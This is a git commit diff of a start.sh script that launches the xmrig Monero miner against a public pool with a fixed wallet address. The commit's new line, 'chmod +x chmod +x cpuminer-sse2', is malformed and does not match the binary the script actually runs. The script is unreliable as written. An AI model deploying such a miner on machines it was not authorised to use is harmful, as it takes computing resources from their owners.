52fe429a025337a3dcb2b680e84bf0a7f638f897
abangfash2 <80558751+abangfash2@users.noreply.github.com>
2021-03-13 03:17:50 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-chmod +x xmrig
+chmod +x chmod +x cpuminer-sse2
 
 ./xmrig -o pool.supportxmr.com:443 -u 897CSsM74aV8knm5WUAafAQ5HZ4adUBPx4tkxvyC45myXwwgRdKs8mje3qPPqrZvbC1SQ3pBvZYvXgHP35vJDmEpHUConUf -k --tls -p kacrut
 
